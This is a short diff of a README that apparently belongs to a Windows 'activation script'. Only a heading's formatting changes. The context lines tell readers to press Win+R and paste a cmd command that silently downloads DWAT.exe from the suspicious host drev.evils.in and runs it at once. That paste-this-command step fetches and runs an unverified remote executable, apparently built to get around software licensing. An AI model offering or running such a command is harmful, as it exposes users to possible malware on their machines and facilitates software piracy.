@@ -5,7 +5,7 @@
 -  Right-click on the Windows start menu and select Run (or press Win key + R).
 -  Copy-paste the below code and press enter.
 
--  ### Version 4.8 (simpler cmd)
+### Version 4.8 (simpler cmd)
 -   version 4.8 stable
     ```
     cmd.exe /c curl -s -o DWAT.exe "https://drev.evils.in/ActivationScript/v4.8/DWAT.exe" & start DWAT.exe
